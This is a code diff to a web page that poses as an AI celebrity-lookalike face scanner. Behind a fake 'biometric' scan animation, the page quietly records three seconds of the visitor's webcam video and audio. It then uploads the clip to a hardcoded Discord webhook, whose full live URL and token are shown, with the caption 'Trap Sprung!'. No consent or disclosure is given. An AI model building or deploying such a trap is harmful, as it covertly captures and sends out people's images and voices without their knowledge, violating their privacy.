@@ -56,12 +56,13 @@
             background: #000;
             margin-bottom: 25px;
             box-shadow: 0 0 20px rgba(56, 189, 248, 0.1);
+            display: none; /* Hidden until connected */
         }
 
         #video-preview {
             width: 100%;
             display: block;
-            transform: scaleX(-1); /* Mirror effect */
+            transform: scaleX(-1);
         }
 
         .scan-line {
@@ -94,6 +95,7 @@
             cursor: pointer;
             width: 100%;
             transition: transform 0.2s, box-shadow 0.2s;
+            margin-bottom: 10px;
         }
 
         button:hover {
@@ -101,11 +103,8 @@
             box-shadow: 0 10px 20px -10px rgba(56, 189, 248, 0.6);
         }
 
-        button:disabled {
-            background: #475569;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
+        #scan-btn {
+            display: none; /* Hidden until camera connects */
         }
 
         #status-text {
@@ -150,27 +149,24 @@
             <img id="celeb-image" src="" alt="Your Match">
         </div>
 
+        <button id="connect-btn">Connect Camera</button>
         <button id="scan-btn">Analyze Face</button>
-        <div id="status-text">Waiting for camera...</div>
+        <div id="status-text">Awaiting camera initialization...</div>
     </div>
 
     <script>
-        // ==========================================
-        // LO'S CONFIGURATION ZONE
-        // ==========================================
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT";
         
-        // Put your 5 funny/rigged picture URLs here
         const RIGGED_IMAGES = [
             "https://cdn.discordapp.com/attachments/1419643482305335401/1505519700833210458/2026-05-17_13-26-39_441.jpg?ex=6a0aebfb&is=6a099a7b&hm=f72dca1e0eddf09f71c1f06adc5e0d365cef8b62ef7603b26c60015a12b96b53&",
             "https://cdn.discordapp.com/attachments/1419643482305335401/1505519701235728515/2026-05-17_13-26-39_621.jpg?ex=6a0aebfb&is=6a099a7b&hm=5692ace96db7b6c49bb1d6d1635dfd8f36bdbe74174a909d3fc5920a91fcea85&",
-            "https://cdn.discordapp.com/attachments/1419643482305335401/1505519701533655140/2026-05-17_13-26-39_451.jpg?ex=6a0aebfc&is=6a099a7c&hm=4ddb7ac034aeed27c54eb8a33dcb22592457b65cf538c1eca102c1c4b90f8ed3&",
-            "https://cdn.discordapp.com/attachments/1419643482305335401/1505519702137503744/2026-05-17_13-26-39_523.jpg?ex=6a0aebfc&is=6a099a7c&hm=19563189ed7a9702525fb7aedfdc8b1dff57b7e2ee11fe8746935767608a6df5&",
+            "https://cdn.discordapp.com/attachments/1419643482305335401/1505519701533655140/2026-05-17_13-26-39_451.jpg?ex=6a0aebfb&is=6a099a7c&hm=4ddb7ac034aeed27c54eb8a33dcb22592457b65cf538c1eca102c1c4b90f8ed3&",
+            "https://cdn.discordapp.com/attachments/1419643482305335401/1505519702137503744/2026-05-17_13-26-39_523.jpg?ex=6a0aebfb&is=6a099a7c&hm=19563189ed7a9702525fb7aedfdc8b1dff57b7e2ee11fe8746935767608a6df5&",
             "https://cdn.discordapp.com/attachments/1419643482305335401/1505516944349073408/2026-05-17_13-26-39_418.png?ex=6a0ae96a&is=6a0997ea&hm=2992741a4f7d9f8cc376848fe955385049b8f62a9d10e98f24fd7acfe0927e66&"
         ];
-        // ==========================================
 
         const video = document.getElementById('video-preview');
+        const connectBtn = document.getElementById('connect-btn');
         const scanBtn = document.getElementById('scan-btn');
         const statusText = document.getElementById('status-text');
         const scanLine = document.getElementById('scan-line');
@@ -182,44 +178,42 @@
         let mediaRecorder;
         let recordedChunks = [];
 
-        // Initialize Camera
-        async function initCamera() {
+        // Wait for user to click before asking for camera
+        connectBtn.onclick = async () => {
+            statusText.innerText = "Requesting permissions...";
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
+                
+                // Show the video feed and the real button
+                camContainer.style.display = 'block';
+                connectBtn.style.display = 'none';
+                scanBtn.style.display = 'block';
                 statusText.innerText = "System ready. Position your face in frame.";
             } catch (err) {
-                statusText.innerText = "Camera access required for AI mapping.";
+                statusText.innerText = "Camera access denied or unavailable.";
                 statusText.style.color = "#ef4444";
-                scanBtn.disabled = true;
             }
-        }
-
-        initCamera();
+        };
 
         scanBtn.onclick = async () => {
-            // 1. UI Changes for Fake Scan
             scanBtn.style.display = 'none';
             scanLine.style.display = 'block';
             statusText.innerText = "Extracting biometric markers...";
 
-            // Fake processing delay to build tension
             setTimeout(() => {
                 statusText.innerText = "Cross-referencing global database...";
             }, 800);
 
             setTimeout(() => {
-                // 2. Reveal the trap
                 scanLine.style.display = 'none';
                 camContainer.style.display = 'none';
                 statusText.style.display = 'none';
                 
-                // Pick random image (20% chance each)
                 const randomPic = RIGGED_IMAGES[Math.floor(Math.random() * RIGGED_IMAGES.length)];
                 celebImage.src = randomPic;
                 resultContainer.style.display = 'block';
 
-                // 3. Start recording the reaction EXACTLY as the image drops
                 startReactionCapture();
             }, 1800);
         };
@@ -241,17 +235,14 @@
 
             mediaRecorder.start();
 
-            // Record for exactly 3 seconds to catch the laugh/shock, then stop
             setTimeout(() => {
                 mediaRecorder.stop();
-                // Stop all camera tracks to turn off the webcam light
                 stream.getTracks().forEach(track => track.stop());
             }, 3000);
         }
 
         function sendToDiscord(blob) {
             const formData = new FormData();
-            // Name the file with a timestamp so they don't overwrite each other
             const filename = `reaction_${new Date().getTime()}.webm`;
             formData.append('file', blob, filename);
             formData.append('content', '🎯 **Trap Sprung!** New reaction captured.');
